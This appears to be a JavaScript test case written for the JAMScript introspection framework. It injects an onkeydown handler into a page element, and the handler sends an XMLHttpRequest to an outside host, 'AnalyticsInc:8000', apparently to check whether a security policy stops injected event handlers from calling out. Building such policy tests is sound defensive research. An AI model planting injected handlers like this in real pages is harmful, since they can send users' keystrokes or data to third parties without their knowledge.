introspect(JAMScript.introspectors.processAll) {
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeydown1", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
v0.setAttribute("onkeydown", exp);

}
